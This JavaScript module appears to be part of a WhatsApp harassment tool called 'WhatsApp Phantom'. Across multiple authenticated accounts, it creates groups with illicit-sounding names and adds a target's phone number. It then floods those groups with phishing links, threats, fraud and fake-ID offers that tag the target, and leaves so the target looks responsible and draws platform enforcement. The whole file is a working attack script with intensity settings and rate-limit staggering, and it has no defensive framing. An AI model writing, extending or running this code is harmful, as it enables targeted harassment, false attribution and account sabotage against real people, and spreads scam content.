/**
 * WhatsApp Phantom - Group Attack Module
 * By Hillary Tizian
 * 
 * Uses Baileys WebSocket API to:
 * - Create multiple toxic groups
 * - Add victim as participant
 * - Flood groups with policy-violating content
 * - Trigger group-level enforcement
 */

const fs = require('fs');
const path = require('path');
const chalk = require('chalk');
const { showStatus } = require('./banner');

let Baileys;
let makeWASocket, useMultiFileAuthState, DisconnectReason, makeCacheableSignalKeyStore;

try {
  Baileys = require('@whiskeysockets/baileys');
  makeWASocket = Baileys.makeWASocket;
  useMultiFileAuthState = Baileys.useMultiFileAuthState;
  DisconnectReason = Baileys.DisconnectReason;
} catch (e) {
  showStatus('Baileys module not found. Run: npm install @whiskeysockets/baileys', 'error');
  throw e;
}

const { Boom } = require('@hapi/boom');

const SPAM_TEMPLATES_PATH = path.join(__dirname, '..', 'cfg', 'spam-templates.json');

let spamTemplates = null;
function loadTemplates() {
  if (spamTemplates) return spamTemplates;
  try {
    if (fs.existsSync(SPAM_TEMPLATES_PATH)) {
      spamTemplates = JSON.parse(fs.readFileSync(SPAM_TEMPLATES_PATH, 'utf8'));
      return spamTemplates;
    }
  } catch (e) {
    showStatus(`Failed to load spam templates: ${e.message}`, 'warn');
  }
  
  spamTemplates = {
    templates: [
      { type: 'spam_offer', content: '$$$ MAKE MONEY FAST $$$ Click here: http://bit.ly/scam-link No experience needed!', weight: 1.0 },
      { type: 'phishing_link', content: 'URGENT: Your account will be suspended! Verify: http://fake-login.com', weight: 3.5 },
      { type: 'harassment', content: 'I know where you live. I have your IP. You will be reported to the authorities.', weight: 2.0 },
      { type: 'illegal_content', content: 'I sell fake passports and IDs. High quality. DM for prices.', weight: 4.0 },
      { type: 'fraud', content: 'Congratulations! You won $1,000,000! Send $100 processing fee to claim.', weight: 3.5 }
    ],
    group_names: [
      '🚨 FREE CASH GIVEAWAY 🚨',
      'SCAMMERS EXPOSED DATABASE',
      'ILLEGAL DOWNLOADS PREMIUM',
      'CRYPTO PUMP SCHEME',
      'ADULT CONTENT PREMIUM ACCESS',
      'FREE ROBUX GENERATOR',
      'PHISHING KIT TUTORIAL',
      'ACCOUNT HACKING SERVICE'
    ],
    group_descriptions: [
      'Limited time offer! Join now!',
      'Exclusive content for members!',
      'Double your money in 24 hours guaranteed!'
    ]
  };
  return spamTemplates;
}

async function createSocket(sessionDir, accountId) {
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
  
  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: true,
    syncFullHistory: false,
    markOnlineOnConnect: false,
    shouldIgnoreJid: jid => jid.includes('@broadcast') || jid.includes('status@broadcast'),
    defaultQueryTimeoutMs: 30000,
    emitOwnEvents: false,
    logger: { info: () => {}, warn: () => {}, error: () => {}, debug: () => {}, trace: () => {} }
  });
  
  sock.ev.on('creds.update', saveCreds);
  
  sock.ev.on('connection.update', ({ connection, lastDisconnect }) => {
    if (connection === 'close') {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      const shouldReconnect = statusCode !== DisconnectReason.loggedOut;
      
      if (statusCode === DisconnectReason.loggedOut) {
        showStatus(`Account ${accountId}: Logged out, needs re-authentication`, 'error');
      }
    } else if (connection === 'open') {
      showStatus(`Account ${accountId}: Connected and ready`, 'ok');
    }
  });
  
  return { sock, saveCreds };
}

async function waitForConnection(sock, accountId, timeoutMs = 60000) {
  return new Promise((resolve, reject) => {
    const timeout = setTimeout(() => {
      reject(new Error(`Account ${accountId}: Connection timeout`));
    }, timeoutMs);
    
    sock.ev.on('connection.update', ({ connection }) => {
      if (connection === 'open') {
        clearTimeout(timeout);
        resolve(true);
      } else if (connection === 'close') {
        clearTimeout(timeout);
        reject(new Error(`Account ${accountId}: Connection closed`));
      }
    });
    
    // Check if already connected
    if (sock.user?.id) {
      clearTimeout(timeout);
      resolve(true);
    }
  });
}

async function run(config, targetNumber, intensity = 'extreme') {
  showStatus('=== GROUP ATTACK MODULE ===', 'attack');
  
  const templates = loadTemplates();
  const results = {
    groupsCreated: 0,
    messagesSent: 0,
    accountsUsed: 0,
    errors: []
  };
  
  // Determine number of groups based on intensity
  const groupCounts = { normal: 3, aggressive: 6, extreme: 10 };
  const groupsToCreate = groupCounts[intensity] || 6;
  
  // Number of messages per group
  const msgCounts = { normal: 5, aggressive: 10, extreme: 20 };
  const messagesPerGroup = msgCounts[intensity] || 10;
  
  const sessionsDir = path.join(__dirname, '..', 'sessions');
  
  // Filter reporters with valid sessions
  const activeReporters = config.reporters.filter(r => {
    const sessionPath = r.session || path.join(sessionsDir, `reporter_${r.id}`);
    return fs.existsSync(path.join(sessionPath, 'creds.json'));
  });
  
  if (activeReporters.length === 0) {
    showStatus('No authenticated reporters for group attack. First run requires QR scanning.', 'warn');
    showStatus('Run phantom.sh and authenticate accounts first.', 'info');
    return results;
  }
  
  const targetJid = `${targetNumber}@s.whatsapp.net`;
  const targetPhone = targetNumber.replace(/[^0-9]/g, '');
  
  showStatus(`Target: ${targetJid}`, 'target');
  showStatus(`Creating ${groupsToCreate} groups with ${activeReporters.length} reporter accounts...`, 'info');
  
  // Launch group creation across multiple reporters
  const groupPromises = [];
  
  for (let i = 0; i < groupsToCreate; i++) {
    const reporter = activeReporters[i % activeReporters.length];
    const sessionPath = reporter.session || path.join(sessionsDir, `reporter_${reporter.id}`);
    
    groupPromises.push(
      (async () => {
        try {
          const { sock } = await createSocket(sessionPath, reporter.id);
          await waitForConnection(sock, reporter.id);
          
          const groupName = templates.group_names[i % templates.group_names.length];
          const groupDesc = templates.group_descriptions[i % templates.group_descriptions.length];
          
          showStatus(`Creating group: "${groupName}" via reporter ${reporter.id}...`, 'attack');
          
          // Create group with target as participant
          const group = await sock.groupCreate(groupName, [targetJid]);
          
          // Update group description
          try {
            await sock.groupUpdateDescription(group.id, groupDesc);
          } catch (e) { /* ignore */ }
          
          // Set group to announcement mode to control message flow
          try {
            await sock.groupSettingUpdate(group.id, 'announcement');
          } catch (e) { /* ignore */ }
          
          // Demote all participants to prevent them from controlling the group
          try {
            const metadata = await sock.groupMetadata(group.id);
            for (const participant of metadata.participants) {
              if (participant.id !== sock.user.id && participant.admin === 'admin') {
                await sock.groupParticipantsUpdate(group.id, [participant.id], 'demote');
              }
            }
          } catch (e) { /* ignore */ }
          
          results.groupsCreated++;
          showStatus(`Group created: ${groupName} (${group.id})`, 'ok');
          
          // Send policy-violating messages
          for (let m = 0; m < messagesPerGroup; m++) {
            const template = templates.templates[m % templates.templates.length];
            const message = template.content;
            
            try {
              await sock.sendMessage(group.id, { 
                text: `${message}\n\nTarget: @${targetPhone}`,
                mentions: [targetJid]
              });
              results.messagesSent++;
              
              // Add a small delay between messages
              await new Promise(r => setTimeout(r, 1500));
            } catch (e) {
              results.errors.push(`Msg ${m}: ${e.message}`);
            }
          }
          
          // Leave the group (but target remains)
          await new Promise(r => setTimeout(r, 2000));
          await sock.groupLeave(group.id);
          showStatus(`Left group ${groupName} — target ${targetPhone} remains`, 'info');
          
          await sock.ws.close();
          return { success: true, group: group.id };
        } catch (e) {
          results.errors.push(`Group ${i}: ${e.message}`);
          showStatus(`Failed to create group ${i}: ${e.message}`, 'error');
          return { success: false, error: e.message };
        }
      })()
    );
    
    // Stagger group creation to avoid rate limiting
    if (i < groupsToCreate - 1) {
      await new Promise(r => setTimeout(r, 3000));
    }
  }
  
  await Promise.all(groupPromises);
  
  results.accountsUsed = activeReporters.length;
  
  showStatus(`Group Attack Summary: ${results.groupsCreated} groups, ${results.messagesSent} messages`, 'ok');
  
  return results;
}

module.exports = { run };
